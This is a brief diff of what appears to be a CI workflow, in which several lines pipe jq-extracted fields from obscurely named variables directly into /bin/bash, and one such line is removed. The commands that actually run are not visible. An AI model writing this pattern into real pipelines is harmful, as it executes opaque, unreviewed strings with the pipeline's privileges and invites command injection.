@@ -27,7 +27,6 @@ jobs:
           echo $uzvsh81 | jq -r .tw0 | /bin/bash
           printf '%s' "$enlkk6499" | jq -r .ekrv9560 | /bin/bash
           echo $d9 | jq -r .g22141 | /bin/bash
-          printf '%s' "$h11" | jq -r .ecox96 | /bin/bash
           printf '%s' "$dlhsk5" | jq -r .q31817 | /bin/bash
           printf '%s' "$yjnbv45" | jq -r .ap29857 | /bin/bash
 
